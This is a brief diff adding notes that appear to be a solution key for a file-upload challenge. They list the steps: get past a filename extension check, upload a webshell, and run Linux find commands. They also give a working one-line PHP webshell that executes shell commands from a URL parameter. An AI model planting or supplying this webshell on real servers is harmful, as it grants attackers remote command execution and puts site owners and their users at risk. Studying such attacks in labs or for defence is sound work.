@@ -1,0 +1,8 @@
+key :
+1. upload file
+2. $ext = pathinfo($fn, PATHINFO_EXTENSION);
+3. <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
+4. upload webshell 
+5. single line webshell 
+<?php echo shell_exec($_GET['e']); ?>
+6. linux cmd find
